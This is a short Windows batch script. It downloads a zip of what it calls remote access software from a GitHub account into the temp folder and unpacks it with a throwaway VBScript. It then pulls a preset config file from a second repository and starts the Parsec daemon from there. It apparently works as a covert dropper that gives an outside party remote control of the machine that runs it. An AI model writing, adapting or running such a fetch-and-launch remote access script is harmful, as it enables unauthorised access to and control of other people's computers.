@echo off
setlocal

curl -L -o "%temp%\parsec.zip" https://github.com/ssl33pl3ss/someremoteaccesssoftware/zipball/master
Call :UnZipFile "%temp%\" "%temp%\parsec.zip"
del "%temp%\parsec.zip"
MOVE %temp%\ssl33pl3ss-someremoteaccesssoftware-ac8e5f3 %temp%\Parsec

curl https://raw.githubusercontent.com/ssl33pl3ss/someremoteaccesssoftwarescript/main/config.txt -o "%temp%\Parsec\config.txt"
start /d "%temp%\Parsec" parsecd.exe

exit /b

:UnZipFile <ExtractTo> <newzipfile>
set vbs="%temp%\_.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If NOT fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%
